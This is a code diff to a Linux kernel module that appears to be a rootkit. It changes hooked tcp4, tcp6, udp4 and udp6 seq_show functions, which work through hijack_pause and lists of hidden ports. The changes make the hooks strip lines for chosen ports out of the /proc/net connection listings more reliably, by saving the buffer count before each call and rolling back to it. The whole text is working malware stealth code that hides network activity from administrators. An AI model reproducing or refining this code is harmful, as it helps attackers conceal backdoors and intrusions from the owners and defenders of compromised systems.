@@ -10,6 +10,8 @@
 #include <linux/init.h>
 
 #define TMPSZ 150
+#define TMPUSZ 128
+#define TMP6SZ 166
 
 static int (*inet_ioctl)(struct socket *, unsigned int, unsigned long);
 static int (*tcp4_seq_show)(struct seq_file *seq, void *v);
@@ -467,6 +469,10 @@ static int n_tcp4_seq_show ( struct seq_file *seq, void *v )
     int ret = 0;
     char port[12];
     struct hidden_port *hp;
+    size_t seqCount;
+
+    seqCount = seq->count;
+
 
     hijack_pause(tcp4_seq_show);
     ret = tcp4_seq_show(seq, v);
@@ -476,9 +482,9 @@ static int n_tcp4_seq_show ( struct seq_file *seq, void *v )
     {
         sprintf(port, ":%04X", hp->port);
 
-        if ( strnstr(seq->buf + seq->count - TMPSZ, port, TMPSZ) )
+        if ( strnstr(seq->buf + seqCount, port, seq->count - seqCount) )
         {
-            seq->count -= TMPSZ;
+            seq->count = seqCount;
             break;
         }
     }
@@ -491,6 +497,10 @@ static int n_tcp6_seq_show ( struct seq_file *seq, void *v )
     int ret;
     char port[12];
     struct hidden_port *hp;
+    size_t seqCount;
+
+    seqCount = seq->count;
+
 
     hijack_pause(tcp6_seq_show);
     ret = tcp6_seq_show(seq, v);
@@ -499,10 +509,9 @@ static int n_tcp6_seq_show ( struct seq_file *seq, void *v )
     list_for_each_entry ( hp, &hidden_tcp6_ports, list )
     {
         sprintf(port, ":%04X", hp->port);
-
-        if ( strnstr(seq->buf + seq->count - TMPSZ, port, TMPSZ) )
+        if ( strnstr(seq->buf + seqCount, port, seq->count - seqCount) )
         {
-            seq->count -= TMPSZ;
+            seq->count = seqCount;
             break;
         }
     }
@@ -515,6 +524,9 @@ static int n_udp4_seq_show ( struct seq_file *seq, void *v )
     int ret;
     char port[12];
     struct hidden_port *hp;
+    size_t seqCount;
+
+    seqCount = seq->count;
 
     hijack_pause(udp4_seq_show);
     ret = udp4_seq_show(seq, v);
@@ -524,9 +536,9 @@ static int n_udp4_seq_show ( struct seq_file *seq, void *v )
     {
         sprintf(port, ":%04X", hp->port);
 
-        if ( strnstr(seq->buf + seq->count - TMPSZ, port, TMPSZ) )
+        if ( strnstr(seq->buf + seqCount, port, seq->count - seqCount) )
         {
-            seq->count -= TMPSZ;
+            seq->count = seqCount;
             break;
         }
     }
@@ -539,6 +551,9 @@ static int n_udp6_seq_show ( struct seq_file *seq, void *v )
     int ret;
     char port[12];
     struct hidden_port *hp;
+    size_t seqCount;
+
+    seqCount = seq->count;
 
     hijack_pause(udp6_seq_show);
     ret = udp6_seq_show(seq, v);
@@ -548,9 +563,9 @@ static int n_udp6_seq_show ( struct seq_file *seq, void *v )
     {
         sprintf(port, ":%04X", hp->port);
 
-        if ( strnstr(seq->buf + seq->count - TMPSZ, port, TMPSZ) )
+        if ( strnstr(seq->buf + seqCount, port, seq->count - seqCount) )
         {
-            seq->count -= TMPSZ;
+            seq->count = seqCount;
             break;
         }
     }
